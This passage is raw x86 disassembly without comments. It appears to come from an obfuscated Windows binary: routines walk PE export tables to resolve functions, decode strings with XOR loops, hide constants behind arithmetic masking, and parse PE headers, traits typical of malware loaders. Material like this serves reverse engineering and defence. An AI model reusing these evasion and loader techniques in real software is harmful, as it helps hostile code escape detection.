  41f97f:	sub    esp,0x50
  41f982:	push   edi
  41f983:	mov    edi,eax
  41f985:	mov    eax,DWORD PTR [edi+0x1a8]
  41f98b:	cmp    DWORD PTR [eax],0x0
  41f98e:	jne    0x41f997
  41f990:	xor    eax,eax
  41f992:	jmp    0x41fac8
  41f997:	push   DWORD PTR [ebp+0x8]
  41f99a:	push   0x2c
  41f99c:	pop    eax
  41f99d:	call   0x41f72c
  41f9a2:	mov    edx,DWORD PTR [edi+0x1ac]
  41f9a8:	lea    eax,[edi+0x22]
  41f9ab:	mov    DWORD PTR [ebp-0x4c],eax
  41f9ae:	lea    eax,[edi+0x44]
  41f9b1:	mov    DWORD PTR [ebp-0x48],eax
  41f9b4:	lea    eax,[edi+0x66]
  41f9b7:	mov    DWORD PTR [ebp-0x44],eax
  41f9ba:	lea    eax,[edi+0x88]
  41f9c0:	mov    DWORD PTR [ebp-0x40],eax
  41f9c3:	lea    eax,[edi+0xaa]
  41f9c9:	mov    DWORD PTR [ebp-0x3c],eax
  41f9cc:	lea    eax,[edi+0xcc]
  41f9d2:	mov    DWORD PTR [ebp-0x38],eax
  41f9d5:	lea    eax,[edi+0xee]
  41f9db:	mov    DWORD PTR [ebp-0x34],eax
  41f9de:	lea    eax,[edi+0x110]
  41f9e4:	mov    DWORD PTR [ebp-0x30],eax
  41f9e7:	lea    eax,[edi+0x132]
  41f9ed:	mov    DWORD PTR [ebp-0x2c],eax
  41f9f0:	lea    eax,[edi+0x154]
  41f9f6:	push   edi
  41f9f7:	mov    DWORD PTR [ebp-0x50],edi
  41f9fa:	mov    DWORD PTR [ebp-0x28],eax
  41f9fd:	call   0x41fafc
  41fa02:	push   eax
  41fa03:	mov    eax,DWORD PTR [edi+0x1a8]
  41fa09:	push   DWORD PTR [eax]
  41fa0b:	call   0x41f79d
  41fa10:	mov    DWORD PTR [ebp-0x10],eax
  41fa13:	test   eax,eax
  41fa15:	je     0x41fac8
  41fa1b:	mov    ecx,DWORD PTR [eax+0x3c]
  41fa1e:	push   ebx
  41fa1f:	push   esi
  41fa20:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  41fa24:	add    esi,eax
  41fa26:	mov    edi,DWORD PTR [esi+0x24]
  41fa29:	mov    ecx,DWORD PTR [esi+0x1c]
  41fa2c:	mov    edx,DWORD PTR [esi+0x20]
  41fa2f:	mov    ebx,DWORD PTR [esi+0x18]
  41fa32:	add    edi,eax
  41fa34:	mov    DWORD PTR [ebp-0x20],edi
  41fa37:	mov    edi,DWORD PTR [esi+0x14]
  41fa3a:	add    ecx,eax
  41fa3c:	add    edx,eax
  41fa3e:	mov    DWORD PTR [ebp-0xc],ecx
  41fa41:	mov    DWORD PTR [ebp-0x1c],edx
  41fa44:	mov    DWORD PTR [ebp-0x8],edi
  41fa47:	cmp    edi,ebx
  41fa49:	ja     0x41fa4e
  41fa4b:	mov    DWORD PTR [ebp-0x8],ebx
  41fa4e:	xor    ebx,ebx
  41fa50:	mov    DWORD PTR [ebp-0x18],ebx
  41fa53:	cmp    DWORD PTR [ebp-0x8],ebx
  41fa56:	jbe    0x41fac6
  41fa58:	jmp    0x41fa5d
  41fa5a:	mov    edx,DWORD PTR [ebp-0x1c]
  41fa5d:	mov    edi,DWORD PTR [ebp-0x20]
  41fa60:	movzx  edi,WORD PTR [edi+ebx*2]
  41fa64:	cmp    ebx,DWORD PTR [esi+0x18]
  41fa67:	jae    0x41fac6
  41fa69:	cmp    edi,DWORD PTR [esi+0x14]
  41fa6c:	jae    0x41fac6
  41fa6e:	mov    ebx,DWORD PTR [edx+ebx*4]
  41fa71:	mov    edx,DWORD PTR [ebp+0x8]
  41fa74:	mov    edi,DWORD PTR [ecx+edi*4]
  41fa77:	mov    DWORD PTR [ebp-0x4],edx
  41fa7a:	lea    edx,[ebp-0x50]
  41fa7d:	add    ebx,eax
  41fa7f:	add    edi,eax
  41fa81:	sub    edx,DWORD PTR [ebp+0x8]
  41fa84:	mov    DWORD PTR [ebp-0x14],0xb
  41fa8b:	mov    DWORD PTR [ebp-0x24],edx
  41fa8e:	mov    edx,DWORD PTR [ebp-0x4]
  41fa91:	cmp    DWORD PTR [edx],0x0
  41fa94:	jne    0x41fab1
  41fa96:	mov    eax,DWORD PTR [ebp-0x24]
  41fa99:	push   DWORD PTR [eax+edx*1]
  41fa9c:	push   ebx
  41fa9d:	call   0x41f897
  41faa2:	mov    ecx,DWORD PTR [ebp-0xc]
  41faa5:	test   eax,eax
  41faa7:	je     0x41faae
  41faa9:	mov    eax,DWORD PTR [ebp-0x4]
  41faac:	mov    DWORD PTR [eax],edi
  41faae:	mov    eax,DWORD PTR [ebp-0x10]
  41fab1:	add    DWORD PTR [ebp-0x4],0x4
  41fab5:	dec    DWORD PTR [ebp-0x14]
  41fab8:	jne    0x41fa8e
  41faba:	mov    ebx,DWORD PTR [ebp-0x18]
  41fabd:	inc    ebx
  41fabe:	mov    DWORD PTR [ebp-0x18],ebx
  41fac1:	cmp    ebx,DWORD PTR [ebp-0x8]
  41fac4:	jb     0x41fa5a
  41fac6:	pop    esi
  41fac7:	pop    ebx
  41fac8:	pop    edi
  41fac9:	leave  
  41faca:	ret    0x4
  41facd:	push   ebp
  41face:	mov    ebp,esp
  41fad0:	mov    eax,DWORD PTR [ebp+0x8]
  41fad3:	push   esi
  41fad4:	push   DWORD PTR [eax+0x1d8]
  41fada:	lea    esi,[eax+0x198]
  41fae0:	mov    eax,DWORD PTR [ebp+0x8]
  41fae3:	call   0x41f97c
  41fae8:	mov    ecx,DWORD PTR [esi]
  41faea:	mov    DWORD PTR [ecx],eax
  41faec:	mov    eax,DWORD PTR [esi]
  41faee:	xor    ecx,ecx
  41faf0:	cmp    DWORD PTR [eax],ecx
  41faf2:	pop    esi
  41faf3:	setne  cl
  41faf6:	mov    eax,ecx
  41faf8:	pop    ebp
  41faf9:	ret    0x4
  41fafc:	mov    ecx,DWORD PTR [edi+0x188]
  41fb02:	push   ebx
  41fb03:	jmp    0x41fb18
  41fb05:	xor    eax,0x8a8d
  41fb0a:	add    eax,0x3b51
  41fb0f:	mov    WORD PTR [ecx],ax
  41fb12:	add    ecx,0x2
  41fb15:	add    edx,0x2
  41fb18:	movzx  eax,WORD PTR [edx]
  41fb1b:	mov    ebx,0x4e22
  41fb20:	cmp    ax,bx
  41fb23:	jne    0x41fb05
  41fb25:	xor    eax,eax
  41fb27:	mov    WORD PTR [ecx],ax
  41fb2a:	mov    eax,DWORD PTR [edi+0x188]
  41fb30:	pop    ebx
  41fb31:	ret    
  41fb32:	push   edi
  41fb33:	mov    edi,eax
  41fb35:	mov    eax,DWORD PTR [esi+0x188]
  41fb3b:	shl    edi,0x6
  41fb3e:	add    eax,edi
  41fb40:	jmp    0x41fb4c
  41fb42:	xor    cl,0x74
  41fb45:	sub    cl,0x8
  41fb48:	mov    BYTE PTR [eax],cl
  41fb4a:	inc    eax
  41fb4b:	inc    edx
  41fb4c:	mov    cl,BYTE PTR [edx]
  41fb4e:	cmp    cl,0x7c
  41fb51:	jne    0x41fb42
  41fb53:	mov    BYTE PTR [eax],0x0
  41fb56:	mov    eax,DWORD PTR [esi+0x188]
  41fb5c:	add    eax,edi
  41fb5e:	pop    edi
  41fb5f:	ret    
  41fb60:	push   ebp
  41fb61:	mov    ebp,esp
  41fb63:	sub    esp,0x38
  41fb66:	push   ebx
  41fb67:	mov    ebx,0xf89c8585
  41fb6c:	mov    DWORD PTR [ebp-0x4],ebx
  41fb6f:	lea    eax,[ebx-0x1]
  41fb72:	push   esi
  41fb73:	mov    DWORD PTR [ebp-0x24],eax
  41fb76:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb79:	mov    edx,DWORD PTR [ebp+0x8]
  41fb7c:	mov    esi,0x751089b
  41fb81:	push   edi
  41fb82:	xor    ecx,esi
  41fb84:	mov    edi,0x3272e2
  41fb89:	add    ecx,edi
  41fb8b:	cmp    edx,ecx
  41fb8d:	je     0x41fcfb
  41fb93:	mov    ecx,DWORD PTR [ebp-0x4]
  41fb96:	mov    edx,DWORD PTR [ebp+0xc]
  41fb99:	xor    ecx,esi
  41fb9b:	add    ecx,edi
  41fb9d:	cmp    edx,ecx
  41fb9f:	je     0x41fcfb
  41fba5:	mov    ecx,DWORD PTR [ebp+0x10]
  41fba8:	mov    DWORD PTR [ebp-0x18],ecx
  41fbab:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbae:	mov    DWORD PTR [ebp-0x14],ecx
  41fbb1:	mov    ecx,DWORD PTR [ebp+0x8]
  41fbb4:	mov    DWORD PTR [ebp-0x1c],0xf89c8507
  41fbbb:	mov    DWORD PTR [ebp-0x20],eax
  41fbbe:	mov    DWORD PTR [ebp-0x10],ebx
  41fbc1:	mov    DWORD PTR [ebp+0xc],eax
  41fbc4:	mov    DWORD PTR [ebp+0x10],0xf89c85bb
  41fbcb:	mov    eax,DWORD PTR [ebp+0xc]
  41fbce:	mov    DWORD PTR [ebp-0xc],ecx
  41fbd1:	xor    eax,esi
  41fbd3:	mov    ecx,0xffcd8d1e
  41fbd8:	sub    ecx,eax
  41fbda:	add    ecx,DWORD PTR [ebp-0x14]
  41fbdd:	mov    DWORD PTR [ebp+0x8],ecx
  41fbe0:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41fbe7:	jmp    0x41fceb
  41fbec:	mov    eax,DWORD PTR [ebp+0xc]
  41fbef:	mov    ecx,DWORD PTR [ebp+0xc]
  41fbf2:	xor    eax,esi
  41fbf4:	xor    ecx,esi
  41fbf6:	lea    ecx,[eax+ecx*1+0x64e5c4]
  41fbfd:	mov    eax,DWORD PTR [ebp+0x8]
  41fc00:	xor    edx,edx
  41fc02:	div    ecx
  41fc04:	mov    eax,DWORD PTR [ebp+0x10]
  41fc07:	mov    ecx,DWORD PTR [ebp+0xc]
  41fc0a:	xor    eax,esi
  41fc0c:	xor    ecx,esi
  41fc0e:	sub    eax,ecx
  41fc10:	cmp    edx,eax
  41fc12:	jne    0x41fca7
  41fc18:	mov    eax,DWORD PTR [ebp+0x8]
  41fc1b:	add    eax,DWORD PTR [ebp-0xc]
  41fc1e:	mov    dl,BYTE PTR [eax]
  41fc20:	mov    eax,DWORD PTR [ebp-0x10]
  41fc23:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc26:	xor    eax,esi
  41fc28:	xor    ecx,esi
  41fc2a:	add    eax,edi
  41fc2c:	add    ecx,edi
  41fc2e:	cmp    eax,ecx
  41fc30:	jae    0x41fc78
  41fc32:	lea    ecx,[eax-0x3272e2]
  41fc38:	mov    DWORD PTR [ebp-0x4],ecx
  41fc3b:	mov    ebx,DWORD PTR [ebp-0x4]
  41fc3e:	xor    ebx,esi
  41fc40:	add    ebx,0x7f55d8fb
  41fc46:	lea    ecx,[ebp+eax*4-0x38]
  41fc4a:	mov    DWORD PTR [ecx],ebx
  41fc4c:	mov    ebx,DWORD PTR [ecx]
  41fc4e:	cmp    ebx,0x244ecbda
  41fc54:	jbe    0x41fc5e
  41fc56:	add    DWORD PTR [ecx],0x405fc19
  41fc5c:	jmp    0x41fc64
  41fc5e:	add    DWORD PTR [ecx],0xfdaf43e7
  41fc64:	mov    ecx,DWORD PTR [ebp-0x8]
  41fc67:	xor    ecx,esi
  41fc69:	inc    eax
  41fc6a:	inc    DWORD PTR [ebp-0x4]
  41fc6d:	add    ecx,edi
  41fc6f:	cmp    eax,ecx
  41fc71:	jb     0x41fc3b
  41fc73:	mov    ebx,0xf89c8585
  41fc78:	mov    eax,DWORD PTR [ebp-0x18]
  41fc7b:	test   eax,eax
  41fc7d:	jne    0x41fc87
  41fc7f:	xor    dl,0x74
  41fc82:	sub    dl,0x8
  41fc85:	jmp    0x41fc9d
  41fc87:	mov    eax,DWORD PTR [ebp-0x1c]
  41fc8a:	xor    al,0x9b
  41fc8c:	mov    cl,0x1e
  41fc8e:	sub    cl,al
  41fc90:	add    dl,cl
  41fc92:	mov    ecx,DWORD PTR [ebp-0x20]
  41fc95:	xor    cl,0x9b
  41fc98:	sub    cl,0x1e
  41fc9b:	ror    dl,cl
  41fc9d:	xor    eax,eax
  41fc9f:	mov    eax,DWORD PTR [ebp+0x8]
  41fca2:	add    eax,DWORD PTR [ebp-0xc]
  41fca5:	mov    BYTE PTR [eax],dl
  41fca7:	mov    eax,DWORD PTR [ebp+0x8]
  41fcaa:	mov    ecx,DWORD PTR [ebp-0x10]
  41fcad:	sub    eax,edi
  41fcaf:	xor    eax,esi
  41fcb1:	cmp    eax,ecx
  41fcb3:	jne    0x41fcd9
  41fcb5:	mov    eax,DWORD PTR [ebp+0x10]
  41fcb8:	mov    ecx,DWORD PTR [ebp+0xc]
  41fcbb:	xor    eax,esi
  41fcbd:	xor    ecx,esi
  41fcbf:	sub    eax,ecx
  41fcc1:	sub    eax,edi
  41fcc3:	xor    eax,esi
  41fcc5:	mov    DWORD PTR [ebp+0x10],eax
  41fcc8:	mov    eax,DWORD PTR [ebp+0xc]
  41fccb:	xor    eax,esi
  41fccd:	mov    ecx,0xffcd8d1e
  41fcd2:	sub    ecx,eax
  41fcd4:	add    ecx,DWORD PTR [ebp-0x14]
  41fcd7:	jmp    0x41fce8
  41fcd9:	mov    eax,DWORD PTR [ebp+0xc]
  41fcdc:	xor    eax,esi
  41fcde:	mov    ecx,0xffcd8d1e
  41fce3:	sub    ecx,eax
  41fce5:	add    ecx,DWORD PTR [ebp+0x8]
  41fce8:	mov    DWORD PTR [ebp+0x8],ecx
  41fceb:	mov    eax,DWORD PTR [ebp+0x10]
  41fcee:	cmp    eax,ebx
  41fcf0:	jne    0x41fbec
  41fcf6:	mov    eax,DWORD PTR [ebp-0x24]
  41fcf9:	jmp    0x41fcfe
  41fcfb:	mov    eax,DWORD PTR [ebp-0x4]
  41fcfe:	xor    eax,esi
  41fd00:	add    eax,edi
  41fd02:	pop    edi
  41fd03:	pop    esi
  41fd04:	pop    ebx
  41fd05:	leave  
  41fd06:	ret    0xc
  41fd09:	push   ebp
  41fd0a:	mov    ebp,esp
  41fd0c:	sub    esp,0x14
  41fd0f:	mov    DWORD PTR [ebp-0x10],0xf89c8585
  41fd16:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  41fd1d:	mov    eax,DWORD PTR [ebx]
  41fd1f:	mov    DWORD PTR [ebp-0x8],eax
  41fd22:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  41fd29:	push   esi
  41fd2a:	push   edi
  41fd2b:	mov    DWORD PTR [ebp-0x14],0xead718a5
  41fd32:	mov    edi,DWORD PTR [ebp-0x4]
  41fd35:	mov    ecx,DWORD PTR [ebp-0x10]
  41fd38:	mov    eax,0x751089b
  41fd3d:	xor    edi,eax
  41fd3f:	mov    edx,0x3272e2
  41fd44:	xor    ecx,eax
  41fd46:	add    edi,edx
  41fd48:	add    ecx,edx
  41fd4a:	imul   edi,ecx
  41fd4d:	jmp    0x41fd95
  41fd4f:	mov    ecx,DWORD PTR [ebp-0x8]
  41fd52:	mov    esi,DWORD PTR [ebp-0x4]
  41fd55:	xor    ecx,eax
  41fd57:	xor    esi,eax
  41fd59:	add    ecx,edx
  41fd5b:	add    esi,edx
  41fd5d:	test   esi,ecx
  41fd5f:	mov    esi,DWORD PTR [ebp-0x8]
  41fd62:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd65:	je     0x41fd7c
  41fd67:	xor    ecx,eax
  41fd69:	xor    esi,eax
  41fd6b:	add    ecx,edx
  41fd6d:	add    esi,edx
  41fd6f:	shr    esi,cl
  41fd71:	mov    ecx,DWORD PTR [ebp-0x14]
  41fd74:	xor    ecx,eax
  41fd76:	add    ecx,edx
  41fd78:	xor    esi,ecx
  41fd7a:	jmp    0x41fd86
  41fd7c:	xor    esi,eax
  41fd7e:	xor    ecx,eax
  41fd80:	add    esi,edx
  41fd82:	add    ecx,edx
  41fd84:	shr    esi,cl
  41fd86:	mov    DWORD PTR [ebp-0x8],esi
  41fd89:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd8c:	xor    ecx,eax
  41fd8e:	lea    edi,[edi+ecx*1+0x3272e2]
  41fd95:	mov    ecx,DWORD PTR [ebp-0xc]
  41fd98:	mov    esi,DWORD PTR [ebp-0x4]
  41fd9b:	xor    esi,eax
  41fd9d:	xor    ecx,eax
  41fd9f:	sub    ecx,esi
  41fda1:	cmp    edi,ecx
  41fda3:	jbe    0x41fd4f
  41fda5:	mov    eax,DWORD PTR [ebp-0x8]
  41fda8:	pop    edi
  41fda9:	mov    DWORD PTR [ebx],eax
  41fdab:	mov    eax,DWORD PTR [ebp-0x8]
  41fdae:	pop    esi
  41fdaf:	leave  
  41fdb0:	ret    
  41fdb1:	push   ebp
  41fdb2:	mov    ebp,esp
  41fdb4:	sub    esp,0x420
  41fdba:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41fdc1:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  41fdc8:	mov    DWORD PTR [ebp-0x18],0xf89c8685
  41fdcf:	push   ebx
  41fdd0:	mov    DWORD PTR [ebp-0x1c],0xf89c8586
  41fdd7:	mov    eax,DWORD PTR [ebp-0x14]
  41fdda:	push   esi
  41fddb:	mov    esi,0x751089b
  41fde0:	push   edi
  41fde1:	xor    eax,esi
  41fde3:	mov    edi,0x3272e2
  41fde8:	add    eax,edi
  41fdea:	mov    DWORD PTR [ebp-0x8],eax
  41fded:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  41fdf4:	mov    DWORD PTR [ebp-0x4],0xead718a5
  41fdfb:	mov    DWORD PTR [ebp-0x10],0x8
  41fe02:	mov    ecx,ecx
  41fe04:	mov    eax,DWORD PTR [ebp-0xc]
  41fe07:	mov    ecx,DWORD PTR [ebp-0x14]
  41fe0a:	xor    eax,esi
  41fe0c:	xor    ecx,esi
  41fe0e:	add    eax,edi
  41fe10:	add    ecx,edi
  41fe12:	imul   eax,ecx
  41fe15:	jmp    0x41fe48
  41fe17:	mov    eax,DWORD PTR [ebp-0x4]
  41fe1a:	sub    eax,edi
  41fe1c:	xor    eax,esi
  41fe1e:	mov    DWORD PTR [ebp-0x8],eax
  41fe21:	lea    ebx,[ebp-0x8]
  41fe24:	call   0x41fd09
  41fe29:	mov    DWORD PTR [ebp-0x8],eax
  41fe2c:	mov    eax,DWORD PTR [ebp-0x8]
  41fe2f:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe32:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  41fe39:	mov    eax,DWORD PTR [ebp-0xc]
  41fe3c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe3f:	xor    eax,esi
  41fe41:	lea    eax,[eax+ecx*1+0x3272e2]
  41fe48:	mov    DWORD PTR [ebp-0x4],eax
  41fe4b:	mov    eax,DWORD PTR [ebp-0x18]
  41fe4e:	mov    ecx,DWORD PTR [ebp-0xc]
  41fe51:	xor    ecx,esi
  41fe53:	xor    eax,esi
  41fe55:	sub    eax,ecx
  41fe57:	mov    ecx,DWORD PTR [ebp-0x4]
  41fe5a:	cmp    ecx,eax
  41fe5c:	jbe    0x41fe17
  41fe5e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fe61:	xor    eax,esi
  41fe63:	add    eax,edi
  41fe65:	mov    DWORD PTR [ebp-0x8],eax
  41fe68:	mov    DWORD PTR [ebp-0x18],0xf89c8686
  41fe6f:	mov    ebx,ebx
  41fe71:	jmp    0x41fed4
  41fe73:	mov    ecx,DWORD PTR [ebp-0x20]
  41fe76:	mov    eax,DWORD PTR [ebp-0x8]
  41fe79:	xor    ecx,esi
  41fe7b:	add    ecx,edi
  41fe7d:	shr    eax,cl
  41fe7f:	mov    DWORD PTR [ebp-0x4],eax
  41fe82:	mov    eax,DWORD PTR [ebp+0x8]
  41fe85:	mov    cl,BYTE PTR [eax]
  41fe87:	mov    BYTE PTR [ebp+0xb],cl
  41fe8a:	mov    cl,BYTE PTR [ebp+0xb]
  41fe8d:	mov    edx,DWORD PTR [ebp-0x8]
  41fe90:	movzx  ecx,cl
  41fe93:	xor    ecx,edx
  41fe95:	mov    DWORD PTR [ebp+0x8],ecx
  41fe98:	mov    ecx,DWORD PTR [ebp-0x18]
  41fe9b:	mov    edx,DWORD PTR [ebp+0x8]
  41fe9e:	xor    ecx,esi
  41fea0:	add    ecx,edi
  41fea2:	and    ecx,edx
  41fea4:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  41feab:	mov    edx,DWORD PTR [ebp-0x4]
  41feae:	xor    ecx,edx
  41feb0:	mov    DWORD PTR [ebp-0x8],ecx
  41feb3:	mov    ecx,DWORD PTR [ebp-0xc]
  41feb6:	xor    ecx,esi
  41feb8:	lea    eax,[eax+ecx*1+0x3272e2]
  41febf:	mov    DWORD PTR [ebp+0x8],eax
  41fec2:	mov    eax,DWORD PTR [ebp-0xc]
  41fec5:	xor    eax,esi
  41fec7:	mov    ecx,0xffcd8d1e
  41fecc:	sub    ecx,eax
  41fece:	add    ecx,DWORD PTR [ebp-0x10]
  41fed1:	mov    DWORD PTR [ebp-0x10],ecx
  41fed4:	mov    eax,DWORD PTR [ebp-0x14]
  41fed7:	mov    ecx,DWORD PTR [ebp-0x10]
  41feda:	xor    eax,esi
  41fedc:	add    eax,edi
  41fede:	cmp    ecx,eax
  41fee0:	jne    0x41fe73
  41fee2:	mov    eax,DWORD PTR [ebp-0x1c]
  41fee5:	mov    ecx,DWORD PTR [ebp-0x8]
  41fee8:	xor    eax,esi
  41feea:	add    eax,edi
  41feec:	pop    edi
  41feed:	pop    esi
  41feee:	xor    eax,ecx
  41fef0:	pop    ebx
  41fef1:	leave  
  41fef2:	ret    0x4
  41fef5:	push   ebp
  41fef6:	mov    ebp,esp
  41fef8:	mov    eax,DWORD PTR [ebp+0x1c]
  41fefb:	mov    ecx,DWORD PTR [ebp+0x8]
  41fefe:	mov    edx,DWORD PTR [ebp+0x10]
  41ff01:	mov    eax,DWORD PTR [eax+0x190]
  41ff07:	mov    eax,DWORD PTR [eax]
  41ff09:	sub    esp,0x64
  41ff0c:	push   ebx
  41ff0d:	push   esi
  41ff0e:	push   edi
  41ff0f:	mov    edi,0x751089b
  41ff14:	xor    ecx,edi
  41ff16:	mov    ebx,0x3272e2
  41ff1b:	add    ecx,ebx
  41ff1d:	cmp    ecx,edx
  41ff1f:	jne    0x41ff30
  41ff21:	or     DWORD PTR ds:0x3750c3f,0x4263eb0e
  41ff2b:	jmp    0x42042c
  41ff30:	mov    ecx,DWORD PTR [ebp+0x8]
  41ff33:	mov    esi,DWORD PTR [ebp+0x14]
  41ff36:	mov    edx,DWORD PTR [esi]
  41ff38:	xor    ecx,edi
  41ff3a:	add    ecx,ebx
  41ff3c:	cmp    edx,ecx
  41ff3e:	je     0x4203e7
  41ff44:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff47:	mov    DWORD PTR [ebp-0x1c],eax
  41ff4a:	mov    DWORD PTR [ebp+0x1c],ecx
  41ff4d:	mov    ecx,DWORD PTR [ebp+0x18]
  41ff50:	mov    eax,DWORD PTR [esi]
  41ff52:	mov    DWORD PTR [ebp-0x20],eax
  41ff55:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  41ff5c:	mov    edx,0xf89c8584
  41ff61:	mov    DWORD PTR [ebp-0x8],edx
  41ff64:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff67:	mov    DWORD PTR [ebp+0x1c],eax
  41ff6a:	mov    eax,DWORD PTR [ebp+0x1c]
  41ff6d:	mov    eax,DWORD PTR [eax+0x190]
  41ff73:	mov    eax,DWORD PTR [eax]
  41ff75:	mov    DWORD PTR [ebp-0x24],ecx
  41ff78:	mov    ecx,DWORD PTR [ebp+0x1c]
  41ff7b:	mov    ecx,DWORD PTR [ecx+0x190]
  41ff81:	mov    ecx,DWORD PTR [ecx]
  41ff83:	add    ecx,DWORD PTR [eax+0x3c]
  41ff86:	mov    DWORD PTR [ebp+0x10],ecx
  41ff89:	mov    eax,DWORD PTR [ebp+0x8]
  41ff8c:	xor    eax,edi
  41ff8e:	add    eax,ebx
  41ff90:	mov    DWORD PTR [ebp-0x4],eax
  41ff93:	mov    eax,DWORD PTR [ebp+0x8]
  41ff96:	xor    eax,edi
  41ff98:	add    eax,ebx
  41ff9a:	mov    DWORD PTR [ebp+0x18],eax
  41ff9d:	mov    eax,DWORD PTR [ebp+0x10]
  41ffa0:	mov    eax,DWORD PTR [eax+0x50]
  41ffa3:	sub    eax,0xc
  41ffa6:	mov    DWORD PTR [ebp-0x28],eax
  41ffa9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffac:	mov    eax,DWORD PTR [eax+0x38]
  41ffaf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffb2:	dec    eax
  41ffb3:	test   DWORD PTR [ecx+0x54],eax
  41ffb6:	mov    eax,DWORD PTR [ebp+0x10]
  41ffb9:	je     0x41ffd3
  41ffbb:	mov    eax,DWORD PTR [eax+0x38]
  41ffbe:	mov    ecx,DWORD PTR [ebp+0x10]
  41ffc1:	mov    ecx,DWORD PTR [ecx+0x54]
  41ffc4:	dec    eax
  41ffc5:	not    eax
  41ffc7:	and    ecx,eax
  41ffc9:	mov    eax,DWORD PTR [ebp+0x10]
  41ffcc:	mov    eax,DWORD PTR [eax+0x38]
  41ffcf:	add    eax,ecx
  41ffd1:	jmp    0x41ffd6
  41ffd3:	mov    eax,DWORD PTR [eax+0x54]
  41ffd6:	mov    DWORD PTR [ebp+0x1c],eax
  41ffd9:	mov    eax,DWORD PTR [ebp+0x8]
  41ffdc:	xor    eax,edi
  41ffde:	add    eax,ebx
  41ffe0:	mov    DWORD PTR [ebp+0x18],eax
  41ffe3:	mov    eax,DWORD PTR [ebp+0x8]
  41ffe6:	xor    eax,edi
  41ffe8:	add    eax,ebx
  41ffea:	mov    DWORD PTR [ebp+0x18],eax
  41ffed:	mov    eax,DWORD PTR [ebp+0x8]
  41fff0:	mov    ecx,DWORD PTR [ebp-0x24]
  41fff3:	xor    eax,edi
  41fff5:	add    eax,ebx
  41fff7:	mov    DWORD PTR [ecx],eax
  41fff9:	mov    DWORD PTR [ebp+0x18],edx
  41fffc:	mov    DWORD PTR [ebp+0x18],0xf89c85bb
  420003:	mov    DWORD PTR [ebp+0x18],0xf89c85ba
  42000a:	mov    DWORD PTR [ebp+0x18],0xf89c85b9
  420011:	mov    eax,DWORD PTR [ebp-0x8]
  420014:	mov    ecx,DWORD PTR [ebp+0x1c]
  420017:	xor    eax,edi
  420019:	add    eax,ebx
  42001b:	imul   eax,ecx
  42001e:	mov    ecx,DWORD PTR [ebp+0x8]
  420021:	mov    edx,DWORD PTR [ebp-0x28]
  420024:	xor    ecx,edi
  420026:	lea    ecx,[ecx+edx*1+0x3272e2]
  42002d:	cmp    eax,ecx
  42002f:	jae    0x4203e0
  420035:	mov    eax,DWORD PTR [ebp+0x8]
  420038:	xor    eax,edi
  42003a:	add    eax,ebx
  42003c:	mov    DWORD PTR [ebp+0x18],eax
  42003f:	mov    eax,DWORD PTR [ebp+0x1c]
  420042:	add    eax,DWORD PTR [ebp-0x1c]
  420045:	mov    DWORD PTR [ebp-0x4],eax
  420048:	push   DWORD PTR [ebp-0x4]
  42004b:	mov    esi,DWORD PTR [ebp-0x1c]
  42004e:	mov    ecx,DWORD PTR [ebp+0x10]
  420051:	call   0x41f149
  420056:	mov    DWORD PTR [ebp+0xc],eax
  420059:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  420060:	mov    eax,DWORD PTR [ebp-0x18]
  420063:	xor    eax,edi
  420065:	lea    ecx,[ebp-0x40]
  420068:	add    eax,ebx
  42006a:	push   ecx
  42006b:	call   0x41f72c
  420070:	mov    eax,DWORD PTR [ebp+0xc]
  420073:	test   eax,eax
  420075:	je     0x4200c5
  420077:	mov    eax,DWORD PTR [ebp-0x18]
  42007a:	xor    eax,edi
  42007c:	add    eax,ebx
  42007e:	push   eax
  42007f:	push   DWORD PTR [ebp+0xc]
  420082:	lea    eax,[ebp-0x40]
  420085:	push   eax
  420086:	call   0x41f5d3
  42008b:	mov    eax,DWORD PTR [ebp-0x4]
  42008e:	mov    DWORD PTR [ebp-0x18],eax
  420091:	mov    eax,DWORD PTR [ebp-0x18]
  420094:	mov    ecx,DWORD PTR [ebp-0x1c]
  420097:	sub    eax,ecx
  420099:	mov    DWORD PTR [ebp-0x18],eax
  42009c:	mov    eax,DWORD PTR [ebp+0xc]
  42009f:	mov    ecx,DWORD PTR [ebp+0xc]
  4200a2:	mov    eax,DWORD PTR [eax+0x10]
  4200a5:	add    eax,DWORD PTR [ecx+0xc]
  4200a8:	mov    ecx,DWORD PTR [ebp-0x18]
  4200ab:	cmp    ecx,eax
  4200ad:	jb     0x4200c5
  4200af:	mov    eax,DWORD PTR [ebp+0xc]
  4200b2:	mov    eax,DWORD PTR [eax+0xc]
  4200b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4200b8:	add    eax,DWORD PTR [ecx+0x8]
  4200bb:	mov    ecx,DWORD PTR [ebp-0x18]
  4200be:	sub    eax,ecx
  4200c0:	jmp    0x4203b3
  4200c5:	push   0xc
  4200c7:	push   DWORD PTR [ebp-0x4]
  4200ca:	lea    eax,[ebp-0x4c]
  4200cd:	push   eax
  4200ce:	call   0x41f5d3
  4200d3:	mov    eax,0xf89c8585
  4200d8:	mov    DWORD PTR [ebp-0x2c],eax
  4200db:	mov    DWORD PTR [ebp-0x30],0xf89c8584
  4200e2:	mov    DWORD PTR [ebp-0x34],0xf89c85bb
  4200e9:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  4200f0:	lea    ecx,[ebp-0x2c]
  4200f3:	mov    DWORD PTR [ebp-0xc],ecx
  4200f6:	lea    ecx,[ebp-0x30]
